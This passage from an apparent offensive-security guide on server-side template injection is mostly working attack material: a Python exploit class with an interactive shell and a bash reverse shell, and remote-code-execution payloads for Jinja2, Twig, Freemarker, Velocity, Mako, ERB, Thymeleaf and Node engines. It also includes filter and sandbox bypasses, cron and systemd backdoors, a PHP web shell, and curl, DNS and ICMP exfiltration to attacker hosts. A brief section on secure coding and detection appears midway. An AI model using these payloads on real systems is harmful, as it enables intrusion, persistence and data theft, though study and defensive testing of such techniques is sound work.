            payload = f'<#assign ex="freemarker.template.utility.Execute"?new()>${{ex("{cmd}")}}'
        
        else:
            print(f"[-] Engine {self.engine} not supported")
            return None
        
        response = self.session.get(f"{self.url}?{self.param}={payload}")
        return response.text

    def read_file(self, filepath):
        """Read file from target system"""
        
        if self.engine == 'jinja2':
            payload = f"{{{{''.__class__.__mro__[1].__subclasses__()[40]('{filepath}').read()}}}}"
        
        elif self.engine == 'twig':
            payload = f"{{{{source('{filepath}')}}}}"
        
        elif self.engine == 'freemarker':
            payload = f'<#assign ex="freemarker.template.utility.ObjectConstructor"?new()>${{ex("java.io.File","{filepath}").text}}'
        
        else:
            print(f"[-] Engine {self.engine} not supported")
            return None
        
        response = self.session.get(f"{self.url}?{self.param}={payload}")
        return response.text
    
    def write_file(self, filepath, content):
        """Write file to target system"""
        
        b64_content = base64.b64encode(content.encode()).decode()
        
        if self.engine == 'jinja2':
            cmd = f"echo {b64_content} | base64 -d > {filepath}"
            payload = f"{{{{''.__class__.__mro__[1].__subclasses__()[396]('{cmd}',shell=True,stdout=-1).communicate()}}}}"
        
        elif self.engine == 'twig':
            payload = f"{{{{_self.env.registerUndefinedFilterCallback('system')}}}}{{{{_self.env.getFilter('echo {b64_content} | base64 -d > {filepath}')}}}}"
        
        response = self.session.get(f"{self.url}?{self.param}={payload}")
        return response.text
    
    def reverse_shell(self, lhost, lport):
        """Deploy reverse shell"""
        
        # Bash reverse shell
        cmd = f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
        
        print(f"[*] Deploying reverse shell to {lhost}:{lport}")
        print(f"[*] Start listener: nc -lvnp {lport}")
        
        return self.execute_command(cmd)
    
    def interactive_shell(self):
        """Interactive command execution"""
        
        print("[+] Interactive shell (type 'exit' to quit)")
        
        while True:
            try:
                cmd = input("$ ")
                
                if cmd.lower() in ['exit', 'quit']:
                    break
                
                result = self.execute_command(cmd)
                print(result)
            
            except KeyboardInterrupt:
                print("\n[*] Exiting...")
                break

def main():
    if len(sys.argv) < 4:
        print(f"Usage: {sys.argv[0]} <url> <param> <engine>")
        print("Engines: jinja2, twig, freemarker")
        sys.exit(1)
    
    url = sys.argv[1]
    param = sys.argv[2]
    engine = sys.argv[3]
    
    exploit = SSTIExploit(url, param, engine)
    
    # Test for vulnerability
    if exploit.test_injection():
        # Interactive shell
        exploit.interactive_shell()

if __name__ == "__main__":
    main()
```

### Payload Optimization and Obfuscation

**Minified Jinja2 Payloads:**

```python
# Standard payload (verbose)
{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}

# Minified version
{{().__class__.__base__.__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0]}}

# Using config object (shorter)
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Using lipsum (very short)
{{lipsum.__globals__.os.popen('id').read()}}

# Using cycler (alternative)
{{cycler.__init__.__globals__.os.popen('id').read()}}
```

**WAF Evasion Payloads:**

```python
# Bypass keyword filtering (Jinja2)
# Original: {{config}}
{{request['application']['__globals__']['__builtins__']['__import__']('os').popen('id').read()}}

# Using string concatenation
{%set a='__cla'+'ss__'%}{{().__getattribute__(a)}}

# Using request.args to smuggle payloads
# URL: ?x=__class__&y=__mro__
{{()|attr(request.args.x)|attr(request.args.y)}}

# Using filters for obfuscation
{{request|attr(request.args.f1)|attr(request.args.f2)}}
# URL: ?f1=application&f2=__globals__

# Base64 encoded attributes (if decode filter exists)
{{request|attr('YXBwbGljYXRpb24='|b64decode)}}

# Nested attribute access
{{request['application']['__globals__']['__builtins__']['eval']('__imp'+'ort__("os").popen("id").read()')}}
```

**Polyglot SSTI Payloads:**

```python
# Works across multiple engines
${7*7}{{7*7}}<%= 7*7 %>#{7*7}

# Multi-engine RCE attempt
${__import__('os').popen('id').read()}{{lipsum.__globals__.os.popen('id').read()}}<%= `id` %>
```

### Environment-Specific Exploitation

**Flask/Jinja2 Specific Techniques:**

```python
# Access Flask config
{{config}}
{{config.items()}}

# Access Flask app
{{self._TemplateReference__context.app}}
{{self.__dict__._TemplateReference__context.app.config}}

# Access request object
{{request.environ}}
{{request.cookies}}
{{request.headers}}

# Access session
{{session}}
{{session.items()}}

# Flask debug console PIN bypass
{{''.__class__.__mro__[1].__subclasses__()[40]('/sys/class/net/eth0/address').read()}}
{{''.__class__.__mro__[1].__subclasses__()[40]('/proc/sys/kernel/random/boot_id').read()}}

# Dumping all Flask globals
{{self.__init__.__globals__}}
```

**Django Template Injection:**

```python
# Django uses restricted template language
# Limited but possible exploitation

# Information disclosure
{{settings.SECRET_KEY}}
{{settings.DATABASES}}

# If debug=True
{{debug}}

# Template tag injection (older versions)
{% load module %}
{% templatetag %}

# [Inference] Django templates are more restrictive than Jinja2
# Direct RCE typically requires chaining with other vulnerabilities
```

**Symfony/Twig Specific Techniques:**

```php
# Access Symfony container
{{app}}
{{app.request}}
{{app.session}}
{{app.environment}}

# Dump service container
{{dump(app.container)}}

# Access security context
{{app.user}}
{{app.security}}

# Environment variables
{{app.request.server.get('PATH')}}
{{_self.env.getGlobals()}}

# Symfony profiler access
{{app.request.attributes.get('_route')}}
{{app.request.request}}
```

**Spring Boot/Thymeleaf Exploitation:**

```java
# Thymeleaf SSTI patterns
${7*7}
*{7*7}
#{7*7}
@{7*7}
~{7*7}

# SpEL (Spring Expression Language) injection
${T(java.lang.Runtime).getRuntime().exec('id')}

# Object instantiation
${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).useDelimiter('\\A').next()}

# ProcessBuilder
${T(java.lang.ProcessBuilder).new('id').start()}

# Class loading
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}

# Reading files
${T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get('/etc/passwd'))}
```

**Node.js Template Engine Exploitation:**

**Express/Pug:**

```javascript
# Code injection
- var x = 1; return global.process.mainModule.require('child_process').execSync('id')

# Using each block
each val in [1]
  - global.process.mainModule.require('child_process').execSync('id')

# Buffered code
= function(){return global.process.mainModule.require('child_process').execSync('id')}()

# Unescaped output
!= function(){return global.process.mainModule.require('child_process').execSync('id')}()
```

**Express/EJS:**

```javascript
# Code execution
<%= global.process.mainModule.require('child_process').execSync('id') %>

# File read
<%= require('fs').readFileSync('/etc/passwd').toString() %>

# Alternative syntax
<%- global.process.mainModule.require('child_process').execSync('id') %>

# Using delimiter option bypass
<%% global.process.mainModule.require('child_process').execSync('id') %%>
```

**Nunjucks (Node.js):**

```javascript
# Similar to Jinja2 but for Node.js
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}

# Using constructor
{{constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString()}}

# Environment access
{{settings.env}}
```

### Advanced Post-Exploitation

**Privilege Escalation via SSTI:**

```python
# Check current user
{{''.__class__.__mro__[1].__subclasses__()[396]('whoami',shell=True,stdout=-1).communicate()[0]}}

# Check sudo permissions
{{''.__class__.__mro__[1].__subclasses__()[396]('sudo -l',shell=True,stdout=-1).communicate()[0]}}

# SUID binary enumeration
{{''.__class__.__mro__[1].__subclasses__()[396]('find / -perm -4000 2>/dev/null',shell=True,stdout=-1).communicate()[0]}}

# Writable directories
{{''.__class__.__mro__[1].__subclasses__()[396]('find / -writable -type d 2>/dev/null',shell=True,stdout=-1).communicate()[0]}}

# Kernel version
{{''.__class__.__mro__[1].__subclasses__()[396]('uname -a',shell=True,stdout=-1).communicate()[0]}}
```

**Persistence Mechanisms:**

```python
# Cron job persistence (Jinja2)
{{''.__class__.__mro__[1].__subclasses__()[396]('(crontab -l 2>/dev/null; echo "* * * * * /bin/bash -c \'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\'") | crontab -',shell=True,stdout=-1).communicate()}}

# SSH key installation
{{''.__class__.__mro__[1].__subclasses__()[396]('mkdir -p ~/.ssh && echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys',shell=True,stdout=-1).communicate()}}

# Backdoor web shell
{{''.__class__.__mro__[1].__subclasses__()[396]('echo "<?php system($_GET[\'cmd\']); ?>" > /var/www/html/shell.php',shell=True,stdout=-1).communicate()}}

# Systemd service persistence
{{''.__class__.__mro__[1].__subclasses__()[396]('cat > /etc/systemd/system/backdoor.service << EOF\n[Service]\nExecStart=/bin/bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"\nRestart=always\nEOF',shell=True,stdout=-1).communicate()}}
{{''.__class__.__mro__[1].__subclasses__()[396]('systemctl enable backdoor && systemctl start backdoor',shell=True,stdout=-1).communicate()}}
```

**Data Exfiltration Techniques:**

```python
# DNS exfiltration (Jinja2)
{{''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd | xxd -p | while read line; do nslookup $line.DATA.attacker.com; done',shell=True,stdout=-1).communicate()}}

# HTTP POST exfiltration
{{''.__class__.__mro__[1].__subclasses__()[396]('curl -X POST -d @/etc/passwd http://ATTACKER_IP:8000/exfil',shell=True,stdout=-1).communicate()}}

# Base64 encoded exfiltration
{{''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd | base64 | curl -X POST -d @- http://ATTACKER_IP:8000/exfil',shell=True,stdout=-1).communicate()}}

# ICMP exfiltration
{{''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd | xxd -p -c 16 | while read line; do ping -c 1 -p $line ATTACKER_IP; done',shell=True,stdout=-1).communicate()}}

# Multi-part file exfiltration
{{''.__class__.__mro__[1].__subclasses__()[396]('split -b 1000 /path/to/large/file /tmp/chunk_ && for f in /tmp/chunk_*; do curl -F "file=@$f" http://ATTACKER_IP:8000/upload; done',shell=True,stdout=-1).communicate()}}
```

**Network Pivoting:**

```python
# Port scanning from compromised host
{{''.__class__.__mro__[1].__subclasses__()[396]('for port in {1..1024}; do timeout 1 bash -c "echo > /dev/tcp/192.168.1.1/$port" 2>/dev/null && echo "Port $port open"; done',shell=True,stdout=-1).communicate()}}

# SSH tunnel establishment
{{''.__class__.__mro__[1].__subclasses__()[396]('ssh -f -N -R 8888:localhost:22 user@ATTACKER_IP',shell=True,stdout=-1).communicate()}}

# Chisel tunnel for pivoting
{{''.__class__.__mro__[1].__subclasses__()[396]('wget http://ATTACKER_IP/chisel -O /tmp/chisel && chmod +x /tmp/chisel && /tmp/chisel client ATTACKER_IP:8080 R:socks',shell=True,stdout=-1).communicate()}}
```

### Testing Methodology and Checklists

**SSTI Testing Checklist:**

```
□ Identify all user input points
  □ URL parameters
  □ POST data
  □ Headers (User-Agent, Referer, X-Forwarded-For, etc.)
  □ Cookies
  □ File upload metadata (filename, content-type)
  □ JSON/XML input fields
  
□ Test basic mathematical expressions
  □ {{7*7}}
  □ ${7*7}
  □ <%= 7*7 %>
  □ #{7*7}
  
□ Identify template engine
  □ Test engine-specific payloads
  □ Analyze error messages
  □ Check HTTP response headers
  □ Review application framework
  
□ Test for information disclosure
  □ Configuration objects
  □ Environment variables
  □ Application context
  □ Registered functions/filters
  
□ Attempt code execution
  □ OS command execution
  □ File system access
  □ Network operations
  
□ Test filter bypasses
  □ Encoding variations
  □ String concatenation
  □ Alternative syntax
  □ Request parameter smuggling
  
□ Document findings
  □ Injection point
  □ Template engine
  □ Working payloads
  □ Achieved access level
```

**Burp Suite Automated Testing:**

```
1. Configure Burp Scanner
   - Enable "Server-side template injection" checks
   - Extensions → Add "Server Side Template Injector"
   
2. Active Scanning with Custom Payloads
   - Intruder → Load SSTI payloads
   - Grep - Match: "49", "7777777", error patterns
   - Position markers: §PAYLOAD§
   
3. Collaborator-based Detection
   - Use Burp Collaborator for OOB detection
   - Payload: {{request.__class__.__mro__[1].__subclasses__()[396]('nslookup BURP_COLLABORATOR',shell=True).communicate()}}
```

**Nuclei Templates for SSTI:**

```yaml
id: ssti-detection

info:
  name: Server-Side Template Injection Detection
  author: security-team
  severity: critical
  description: Detects SSTI vulnerabilities across multiple template engines

requests:
  - method: GET
    path:
      - "{{BaseURL}}/?name={{payload}}"
    
    payloads:
      payload:
        - "{{7*7}}"
        - "${7*7}"
        - "<%= 7*7 %>"
        - "#{7*7}"
        - "*{7*7}"
        - "{{7*'7'}}"
    
    matchers-condition: or
    matchers:
      - type: word
        words:
          - "49"
        part: body
      
      - type: word
        words:
          - "7777777"
        part: body
      
      - type: regex
        regex:
          - "jinja2\\.exceptions"
          - "TemplateAssertionError"
          - "TemplateSyntaxError"
        part: body

---

id: jinja2-rce

info:
  name: Jinja2 Template Injection RCE
  author: security-team
  severity: critical

requests:
  - method: GET
    path:
      - "{{BaseURL}}/?name={{payload}}"
    
    payloads:
      payload:
        - "{{config}}"
        - "{{''.__class__.__mro__[1].__subclasses__()}}"
        - "{{lipsum.__globals__}}"
    
    matchers:
      - type: word
        words:
          - "SECRET_KEY"
          - "subprocess.Popen"
          - "__builtins__"
        part: body
```

### Defense and Mitigation Strategies

**Secure Coding Practices:**

```python
# VULNERABLE: Direct string concatenation
from flask import request, render_template_string

@app.route('/hello')
def hello():
    name = request.args.get('name')
    template = f'<h1>Hello {name}!</h1>'  # VULNERABLE
    return render_template_string(template)

# SECURE: Use parameterized templates
from flask import request, render_template_string

@app.route('/hello')
def hello():
    name = request.args.get('name')
    template = '<h1>Hello {{ name }}!</h1>'  # Template variable
    return render_template_string(template, name=name)  # Safe parameter passing

# SECURE: Use template files instead of strings
from flask import request, render_template

@app.route('/hello')
def hello():
    name = request.args.get('name')
    return render_template('hello.html', name=name)  # Separate template file
```

**Input Validation and Sanitization:**

```python
# Whitelist allowed characters
import re

def sanitize_input(user_input):
    # Only allow alphanumeric and basic punctuation
    if not re.match(r'^[a-zA-Z0-9\s\.,!?-]+$', user_input):
        raise ValueError("Invalid input")
    return user_input

# Length restrictions
def validate_length(user_input, max_length=100):
    if len(user_input) > max_length:
        raise ValueError("Input too long")
    return user_input

# Blacklist dangerous patterns
def check_dangerous_patterns(user_input):
    dangerous = ['{{', '}}', '{%', '%}', '${', '}', '<%', '%>', '#{', '#}']
    for pattern in dangerous:
        if pattern in user_input:
            raise ValueError("Dangerous pattern detected")
    return user_input
```

**Template Engine Sandboxing:**

```python
# Jinja2 with sandboxed environment
from jinja2.sandbox import SandboxedEnvironment

env = SandboxedEnvironment()
template = env.from_string(user_template)
output = template.render(name=user_name)

# Custom sandbox with restricted globals
from jinja2 import Environment

class RestrictedEnvironment(Environment):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        # Remove dangerous globals
        self.globals.pop('range', None)
        self.globals.pop('lipsum', None)
        self.globals.pop('cycler', None)
        self.globals.pop('joiner', None)

env = RestrictedEnvironment()
```

**Content Security Policy (CSP):**

```python
# Flask CSP headers
from flask import Flask, make_response

@app.after_request
def set_csp(response):
    response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self'"
    return response
```

[Inference] Complete SSTI prevention requires defense-in-depth: input validation, template sandboxing, principle of least privilege, and avoiding dynamic template generation from user input entirely when possible.

---

## Jinja2 Exploitation (Python)

Jinja2 is the default template engine for Flask and is widely used in Python web applications.

### Basic Reconnaissance

**Accessing Python Objects:**

```jinja2
{{ config }}                    # Flask config object
{{ self }}                      # Template context
{{ request }}                   # Flask request object
{{ lipsum }}                    # Built-in function
```

**Object Introspection:**

```jinja2
{{ ''.__class__ }}              # <class 'str'>
{{ ''.__class__.__mro__ }}      # Method Resolution Order
{{ ''.__class__.__mro__[1] }}   # <class 'object'>
```

### Reaching RCE via Object Traversal

**Classic Exploitation Chain:**

**Step 1: Get to Base Object Class**

```jinja2
{{ ''.__class__.__mro__[1] }}
```

**Step 2: Get All Subclasses**

```jinja2
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

**Step 3: Find Useful Classes**

Common target classes for exploitation:

- `subprocess.Popen` - Direct command execution
- `os._wrap_close` - File operations with command execution
- `warnings.catch_warnings` - Has `__builtins__` access

**Finding subprocess.Popen:**

```jinja2
{% for i in range(500) %}
  {% if ''.__class__.__mro__[1].__subclasses__()[i].__name__ == 'Popen' %}
    {{ i }}
  {% endif %}
{% endfor %}
```

**Manual Search Alternative:**

```jinja2
{{ ''.__class__.__mro__[1].__subclasses__()[396] }}
# If index 396 = <class 'subprocess.Popen'>
```

**Step 4: Execute Commands**

```jinja2
{{ ''.__class__.__mro__[1].__subclasses__()[396]('whoami', shell=True, stdout=-1).communicate()[0].strip() }}
```

### Advanced Jinja2 Exploitation Techniques

#### Using catch_warnings for **builtins**

**Access Pattern:**

```jinja2
{{ self.__init__.__globals__.__builtins__ }}
```

**Full Exploitation:**

```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

**Alternative with lipsum:**

```jinja2
{{ lipsum.__globals__.__builtins__.__import__('os').popen('whoami').read() }}
```

**Using cycler:**

```jinja2
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```

#### File Operations

**Reading Files:**

```jinja2
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
# Index 40 typically = <class '_io.TextIOWrapper'>
```

**Alternative with open():**

```jinja2
{{ self.__init__.__globals__.__builtins__.open('/etc/passwd').read() }}
```

**Writing Files:**

```jinja2
{{ self.__init__.__globals__.__builtins__.open('/tmp/shell.sh','w').write('bash -i >& /dev/tcp/10.10.10.10/4444 0>&1') }}
```

#### Bypassing Filters and Restrictions

**Blacklist Bypass - Underscore Filtering:**

If `_` is filtered:

```jinja2
# Using request.args to smuggle underscore
{{ request['args']['x'] }}
# Then call with: ?x=__class__

# Using attr() filter
{{ ''|attr('__class__') }}
{{ ''|attr(request.args.x) }}  # ?x=__class__
```

**Blacklist Bypass - Quotes Filtering:**

```jinja2
# Using request.args
{{ lipsum|attr(request.args.a)|attr(request.args.b)|attr(request.args.c)(request.args.d)|attr(request.args.e)(request.args.f)|attr(request.args.g)() }}
# Call with: ?a=__globals__&b=__builtins__&c=__import__&d=os&e=popen&f=whoami&g=read
```

**Blacklist Bypass - Brackets Filtering:**

```jinja2
# Using |attr instead of brackets
{{ ''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1) }}

# Using getitem
{{ ''.__class__.__mro__.__getitem__(1) }}
```

**Blacklist Bypass - 'config' Filtering:**

```jinja2
# Access via request
{{ request.application.__self__._get_data_for_json.__globals__.config }}

# Via url_for
{{ url_for.__globals__.current_app.config }}
```

### Jinja2 Sandboxed Environment Bypass

**[Inference]** Jinja2 can run in a sandboxed environment where dangerous attributes/functions are restricted.

**Sandbox Escape Techniques:**

**Using format string:**

```jinja2
{{ "{0.__class__.__mro__[1].__subclasses__()[396]('whoami',shell=True,stdout=-1).communicate()[0].strip()}".format("") }}
```

**Via string methods:**

```jinja2
{{ ""|select|string|list|attr("pop")(24) }}  # Gets '_'
```

**Namespace pollution:**

```jinja2
{% set a = namespace(b=1) %}
{% set a.b = ''.__class__.__mro__[1].__subclasses__()[396] %}
{{ a.b('id',shell=True,stdout=-1).communicate() }}
```

### Practical Jinja2 Payloads

**Automated Subclass Finder:**

```jinja2
{% for i in range(0,500) %}
{{ i }}:{{ ''.__class__.__mro__[1].__subclasses__()[i].__name__ }}
{% endfor %}
```

**One-Liner RCE (Adjust Index):**

```jinja2
{{''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0]}}
```

**Reverse Shell Payload:**

```jinja2
{{''.__class__.__mro__[1].__subclasses__()[396]('bash -c "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1"',shell=True,stdout=-1).communicate()}}
```

**Reading Flask Config/Secrets:**

```jinja2
{{ config.items() }}
{{ config['SECRET_KEY'] }}
```

---

## Mako Exploitation (Python)

Mako is another Python template engine, commonly used with Pyramid and other frameworks.

### Basic Mako Syntax

**Variable Interpolation:**

```mako
${ 7*7 }          # 49
${ "test" }       # test
```

**Python Code Blocks:**

```mako
<% import os %>
${ os.popen('whoami').read() }
```

### Mako RCE Exploitation

**Direct Code Execution:**

```mako
<%
import os
x = os.popen('id').read()
%>
${x}
```

**One-Liner:**

```mako
${ __import__('os').popen('whoami').read() }
```

**Alternative Import Method:**

```mako
<%
import subprocess
result = subprocess.check_output(['whoami'])
%>
${result}
```

### Mako Module-Level Code

**[Inference]** Mako allows module-level code blocks that execute when template is loaded:

```mako
<%!
import os
def run_cmd(cmd):
    return os.popen(cmd).read()
%>

${ run_cmd('id') }
```

### Accessing Context Objects

**Mako Context Variables:**

```mako
${ context }           # Template context
${ self }              # Current template
${ parent }            # Parent template (if inheritance)
${ next }              # Next def
```

**Exploitation via Context:**

```mako
${ context.get('__builtins__')['__import__']('os').popen('id').read() }
```

### Practical Mako Payloads

**File Read:**

```mako
${ open('/etc/passwd').read() }
```

**File Write:**

```mako
<%
with open('/tmp/pwned', 'w') as f:
    f.write('hacked')
%>
```

**Reverse Shell:**

```mako
<%
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.10.10",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
%>
```

---

## ERB Exploitation (Ruby)

ERB (Embedded Ruby) is the default template engine for Ruby on Rails and Sinatra.

### Basic ERB Syntax

**Expression Tags:**

```erb
<%= 7*7 %>              # Evaluates and prints: 49
<% 7*7 %>               # Evaluates but doesn't print
<%# Comment %>          # Comment
<%- expression -%>      # Suppresses whitespace
```

### ERB RCE Exploitation

**Basic Command Execution:**

```erb
<%= system('whoami') %>              # Returns true/false
<%= `whoami` %>                       # Backticks - returns output
<%= %x{whoami} %>                     # Alternative syntax
```

**Using Open3:**

```erb
<%= require 'open3'; Open3.capture2('id')[0] %>
```

**Using IO.popen:**

```erb
<%= IO.popen('whoami').read %>
```

**Using exec (replaces current process):**

```erb
<% exec('whoami') %>    # Warning: Terminates Ruby process
```

### Accessing Ruby Objects and Classes

**Object Introspection:**

```erb
<%= Object.constants %>
<%= Object.methods %>
<%= self.class %>
<%= self.methods %>
```

**Kernel Module Methods:**

```erb
<%= Kernel.methods %>
<%= Kernel.eval("`whoami`") %>
```

### ERB Filter Bypasses

**Bypassing 'system' Blacklist:**

```erb
<%= `whoami` %>
<%= %x(whoami) %>
<%= IO.popen('whoami').read %>
<%= eval('sys'+'tem("whoami")') %>
<%= send(:system, 'whoami') %>
```

**Bypassing Backtick Blacklist:**

```erb
<%= %x(whoami) %>
<%= system('whoami') %>
<%= IO.popen('whoami').read %>
```

**Using Object.send:**

```erb
<%= Object.send(:system, 'whoami') %>
<%= Object.const_get(:Kernel).system('whoami') %>
```

### Accessing Rails Application Objects

**[Inference]** In Rails applications, ERB templates have access to application context:

```erb
<%= Rails.application.secrets %>
<%= Rails.application.config %>
<%= ActiveRecord::Base.connection.execute("SELECT * FROM users") %>
```

**Session Access:**

```erb
<%= session.to_hash %>
<%= cookies.to_hash %>
```

### Practical ERB Payloads

**File Read:**

```erb
<%= File.read('/etc/passwd') %>
<%= IO.read('/etc/passwd') %>
```

**File Write:**

```erb
<% File.write('/tmp/pwned', 'hacked') %>
```

**Directory Listing:**

```erb
<%= Dir.entries('/') %>
<%= Dir.glob('/*') %>
```

**Reverse Shell:**

```erb
<%= system("bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'") %>
```

**Ruby Reverse Shell (More Reliable):**

```erb
<%
require 'socket'
require 'open3'
s=TCPSocket.new("10.10.10.10",4444)
while cmd=s.gets
  Open3.popen3(cmd){|i,o,e,t|s.puts(o.read+e.read)}
end
%>
```

---

## Freemarker Exploitation (Java)

Freemarker is a Java template engine commonly used in Spring Framework applications.

### Basic Freemarker Syntax

**Variable Interpolation:**

```freemarker
${7*7}                          # 49
${"test"?upper_case}            # TEST
${expression}                   # Interpolation
```

**Directives:**

```freemarker
<#assign x = 7*7>               # Variable assignment
${x}                            # 49
```

### Freemarker RCE via Built-in Functions

**Using new Built-in ([Unverified - version dependent]):**

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("whoami")}
```

**Using ObjectConstructor:**

```freemarker
<#assign classLoader=object?api.class.getClassLoader()>
<#assign clazz=classLoader.loadClass("freemarker.template.utility.Execute")>
<#assign obj=clazz?new()>
${obj("whoami")}
```

### Freemarker API Built-in Exploitation

**Accessing Java Objects:**

```freemarker
${"string"?api}                                    # String API
${"string"?api.class}                              # java.lang.String
${"string"?api.class.forName("java.lang.Runtime")} # Runtime class
```

**RCE Chain:**

```freemarker
<#assign runtime=object?api.class.forName("java.lang.Runtime")>
<#assign instance=runtime.getRuntime()>
<#assign exec=instance.exec("whoami")>
<#assign input=exec.getInputStream()>
<#assign scanner=object?api.class.forName("java.util.Scanner")>
<#assign s=scanner.getDeclaredConstructor(object?api.class.forName("java.io.InputStream")).newInstance(input)>
<#assign output=s.useDelimiter("\\A").next()>
${output}
```

### Simplified Exploitation Methods

**Using Execute Class (if available):**

```freemarker
<#assign value=object?api.class.forName("freemarker.template.utility.Execute")?new()>
${value("id")}
```

**Using ObjectConstructor (if available):**

```freemarker
<#assign value=object?api.class.forName("freemarker.template.utility.ObjectConstructor")?new()>
${value("java.lang.ProcessBuilder", ["whoami"]).start()}
```

**Using JythonRuntime ([Unverified - requires Jython]):**

```freemarker
<#assign value=object?api.class.forName("freemarker.template.utility.JythonRuntime")?new()>
<@value>import os; os.system("whoami")</@value>
```

### Freemarker Configuration Bypass

**[Inference]** Modern Freemarker versions restrict dangerous classes by default via `TemplateClassResolver`.

**Attempting Bypass:**

```freemarker
<#assign classLoader=.main_template.class.protectionDomain.classLoader>
<#assign clazz=classLoader.loadClass("java.lang.Runtime")>
<#assign runtime=clazz.getMethod("getRuntime",null).invoke(null,null)>
<#assign exec=clazz.getMethod("exec",classLoader.loadClass("java.lang.String")).invoke(runtime,"id")>
${exec}
```

### Freemarker Information Disclosure

**Environment Variables:**

```freemarker
${.data_model}                  # Data model content
${.globals}                     # Global variables
${.main}                        # Main template
${.namespace}                   # Current namespace
```

**Configuration Information:**

```freemarker
${.version}                     # Freemarker version
${.locale}                      # Current locale
```

### Practical Freemarker Payloads

**File Read (if FileReader available):**

```freemarker
<#assign file=object?api.class.forName("java.io.File")?new("/etc/passwd")>
<#assign reader=object?api.class.forName("java.io.FileReader")?new(file)>
<#assign buffered=object?api.class.forName("java.io.BufferedReader")?new(reader)>
<#list 1..100 as i>
${buffered.readLine()!}
</#list>
```

**Process Execution Chain:**

```freemarker
<#assign pb=object?api.class.forName("java.lang.ProcessBuilder")>
<#assign arr=object?api.class.forName("java.util.ArrayList")?new()>
${arr.add("bash")}
${arr.add("-c")}
${arr.add("whoami")}
<#assign proc=pb?new(arr).start()>
<#assign is=proc.getInputStream()>
<#assign isr=object?api.class.forName("java.io.InputStreamReader")?new(is)>
<#assign br=object?api.class.forName("java.io.BufferedReader")?new(isr)>
<#list 1..10 as i>
${br.readLine()!}
</#list>
```

---

## Velocity Template Injection (Java)

Apache Velocity is another Java template engine used in various applications.

### Basic Velocity Syntax

**Variable References:**

```velocity
$name                           # Variable reference
${name}                         # Formal notation
$!name                          # Quiet reference (no output if null)
```

**Directives:**

```velocity
#set($x = 7*7)                  # Set variable
$x                              # 49
```

### Velocity RCE Exploitation

**Using Runtime.exec:**

```velocity
#set($runtime = $class.forName("java.lang.Runtime"))
#set($process = $runtime.getRuntime().exec("whoami"))
#set($input = $process.getInputStream())
#set($bytes = [0..4096])
#set($read = $input.read($bytes))
$bytes
```

**Using ProcessBuilder:**

```velocity
#set($pb = $class.forName("java.lang.ProcessBuilder"))
#set($arr = ["bash", "-c", "whoami"])
#set($proc = $pb.newInstance($arr).start())
#set($is = $proc.getInputStream())
#set($scanner = $class.forName("java.util.Scanner").newInstance($is).useDelimiter("\A"))
#if($scanner.hasNext())$scanner.next()#end
```

### Accessing Java Classes and Methods

**Class Introspection:**

```velocity
$class                          # Class tool (if available)
$class.inspect(obj)             # Inspect object
```

**[Inference]** Velocity provides ClassTool in default context, which can be leveraged:

```velocity
#set($str = "")
#set($class = $str.class)
#set($runtime = $class.forName("java.lang.Runtime"))
#set($rt = $runtime.getRuntime())
#set($proc = $rt.exec("id"))
```

### Alternative Velocity Exploitation Paths

**Using Class.forName via String:**

```velocity
#set($s="")
#set($stringClass=$s.getClass())
#set($runtime=$stringClass.forName("java.lang.Runtime"))
#set($rt=$runtime.getRuntime())
#set($process=$rt.exec("whoami"))
#set($input=$process.getInputStream())
#set($scanner=$stringClass.forName("java.util.Scanner").getDeclaredConstructor($stringClass.forName("java.io.InputStream")).newInstance($input))
#set($output=$scanner.useDelimiter("\A").next())
$output
```

**Reflection-Based Approach:**

```velocity
#set($x='')
#set($rt=$x.class.forName('java.lang.Runtime'))
#set($chr=$x.class.forName('java.lang.Character'))
#set($str=$x.class.forName('java.lang.String'))
#set($ex=$rt.getRuntime().exec('id'))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$chr.toString($out.read())
#end
```

### Velocity Context Manipulation

**Accessing Application Context:**

```velocity
$request                        # HTTP request
$response                       # HTTP response
$session                        # Session object
```

**Iterating Context Variables:**

```velocity
#foreach($key in $context.keys)
$key = $context.get($key)
#end
```

### Practical Velocity Payloads

**File Read:**

```velocity
#set($s="")
#set($fileClass=$s.class.forName("java.io.File"))
#set($file=$fileClass.newInstance("/etc/passwd"))
#set($readerClass=$s.class.forName("java.io.FileReader"))
#set($reader=$readerClass.newInstance($file))
#set($bufferedClass=$s.class.forName("java.io.BufferedReader"))
#set($buffered=$bufferedClass.newInstance($reader))
#set($line=$buffered.readLine())
#while($line)
$line
#set($line=$buffered.readLine())
#end
```

**DNS Exfiltration:**

```velocity
#set($x='')
#set($rt=$x.class.forName('java.lang.Runtime'))
#set($cmd="nslookup exfil.attacker.com")
